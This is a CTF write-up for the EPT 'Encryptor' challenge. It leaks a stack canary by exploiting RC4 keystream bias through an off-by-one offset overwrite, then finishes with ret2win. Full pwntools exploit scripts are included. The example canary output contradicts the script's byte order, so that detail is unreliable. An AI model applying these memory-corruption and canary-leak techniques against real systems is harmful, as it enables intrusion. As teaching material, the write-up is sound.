---
title: "Encryptor"
summary: "Leaking a stack canary using RC4 keystream bias, then ret2win."
date: 2025-11-08
topics: ["crypto", "pwn"]
ctfs: ["ept-25"]
tags: ["rc4", "stream-cipher", "stack-canary", "bias"]
draft: false
---

{{< katex >}}

> Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!

```sh
ncat --ssl encryptor-pwn.ept.gg 1337
```

---

The challenge provides a single ELF binary, `encryptor`, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.

```
Welcome to the EPT encryptor!
Please behave yourself, and remember to stay away from a certain function at 0x55da2f7324f0!
1. Encrypt a message
2. Reset the key and encrypt again
3. Change offset
4. Exit
>
```

Despite PIE being enabled, the address of `win()` is printed on startup, removing the need for a separate code pointer leak.

---

## Binary protections

All standard mitigations are enabled.

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

---

## Reverse engineering

### Encryption logic

Menu option 1 allows the user to encrypt an arbitrary string.

```c
if (menu_choice == 1) {
    printf("Enter string to encrypt\n> ");
    fgets(local_108, 242, stdin);
    RC4(key, local_108 + local_18, local_1f8, local_108 + local_18);
    puts_hex(local_1f8);
    resetKey();
}
```

Two issues immediately stand out:

* `fgets()` reads **242 bytes** into a **240-byte buffer**
* The RC4 input pointer is offset by a stack variable `local_18`

Relevant stack layout:

```c
uchar local_1f8[240];  // ciphertext
char  local_108[240];  // user input
```

Because `fgets()` writes a trailing null byte, this results in a **1-byte overflow past `local_108`**, corrupting the least significant byte of `local_18`.

---

### Disabled offset control

There is a menu option intended to change this offset:

```
> 3
Sorry, offset function disabled due to abuse!
```

However, since `local_18` is stored directly after the input buffer, the off-by-one overwrite allows us to modify it anyway. This gives indirect control over where RC4 reads plaintext from on the stack.

---

## Stack layout and target

The relevant portion of the stack frame looks like this:

```
[ user input buffer ] 240 bytes
[ offset variable   ] 1 byte (LSB controllable)
[ padding           ]
[ stack canary      ] 8 bytes
[ saved rbp         ] 8 bytes
[ return address    ] 8 bytes
```

By adjusting the RC4 input offset, we can cause RC4 to encrypt arbitrary stack bytes, including the stack canary.

---

## RC4 keystream bias

RC4 is a stream cipher that generates a keystream `K` and encrypts via XOR:

$$
C = P \oplus K
$$

RC4 is known to exhibit statistical biases in its early output bytes. In particular, the **second keystream byte** is biased toward zero with probability:

$$
\Pr[K_2 = 0] = \frac{1}{128}
$$

instead of the uniform `1/256`.

This enables a distinguishing attack: if the plaintext byte is constant across encryptions with fresh keys, the most frequent ciphertext byte converges to the plaintext value.

---

## Canary leakage via bias

We exploit this by:

1. Forcing RC4 to encrypt a chosen stack byte
2. Aligning that byte with keystream index 2
3. Repeating encryption with fresh random keys
4. Taking the most frequent ciphertext byte

On amd64, the first byte of the stack canary is always `0x00`, so only the remaining 7 bytes need to be recovered.

---

### Canary recovery script

Below is the core logic used to recover the canary one byte at a time.

```python
from pwn import *

elf = ELF("encryptor")
p = process(elf.path)

p.recvline()
win_addr = int(p.recvline().split(b"at ")[1][2:-1], 16)

canary = [0x00]

for i in range(1, 8):
    counts = {j: 0 for j in range(256)}

    # craft input so the RC4 plaintext pointer lands on canary[i]
    payload = (b"\x00" * 240 + p8(0xf7 + i))[:241]

    p.sendlineafter(b">", b"1")
    p.sendafter(b">", payload)

    while True:
        p.sendlineafter(b">", b"2")
        ct = bytes.fromhex(
            p.recvline().split(b"Encrypted: ")[1].decode()
        )

        counts[ct[1]] += 1

        best = max(counts, key=counts.get)
        second = sorted(counts.values())[-2]

        if counts[best] - second > 5:
            canary.append(best)
            break

canary = bytes(canary)
log.success(f"canary = {canary.hex()}")
```

Notes:

* Only the least significant byte of the offset is controlled
* Keystream index 2 is targeted because its bias is strongest
* The threshold is heuristic and may need tuning on remote

Example output:

```
canary = 6f28c7b1a4923e00
```

---

## ret2win

The binary contains a hidden menu option:

```c
if (menu_choice == 1337) {
    printf("Leaving already? Enter feedback:\n> ");
    fgets(local_108, 288, stdin);
}
```

This reads **288 bytes into a 240-byte buffer**, allowing full control of the return address.

With the stack canary known and `win()` already leaked, exploitation is trivial.

---

### Final payload

```python
p.sendlineafter(b">", b"1337")
p.sendlineafter(
    b">",
    b"A" * 0xf8 + canary + b"B" * 8 + p64(win_addr)
)
p.interactive()
```

Successful execution:

```
EPT{test_flag}
```

---

## Final solve script

Below is the consolidated exploit used locally and remotely.

```python
from pwn import *

elf = ELF("encryptor")
p = process(elf.path)

p.recvline()
win_addr = int(p.recvline().split(b"at ")[1][2:-1], 16)

canary = [0x00]

for i in range(1, 8):
    counts = {j: 0 for j in range(256)}
    payload = (b"\x00" * 240 + p8(0xf7 + i))[:241]

    p.sendlineafter(b">", b"1")
    p.sendafter(b">", payload)

    while True:
        p.sendlineafter(b">", b"2")
        ct = bytes.fromhex(
            p.recvline().split(b"Encrypted: ")[1].decode()
        )
        counts[ct[1]] += 1

        best = max(counts, key=counts.get)
        second = sorted(counts.values())[-2]

        if counts[best] - second > 5:
            canary.append(best)
            break

canary = bytes(canary)

p.sendlineafter(b">", b"1337")
p.sendlineafter(
    b">",
    b"A" * 0xf8 + canary + b"B" * 8 + p64(win_addr)
)

print(p.recvall().decode())
```

---

## Takeaways

* RC4 remains exploitable even outside traditional network protocols
* Single-byte overwrites are often sufficient to defeat stack canaries
* Cryptographic bias can be weaponized as an information leak
* Disabling functionality does not remove its security impact

This challenge is a good example of cryptographic weaknesses amplifying memory corruption rather than replacing it.

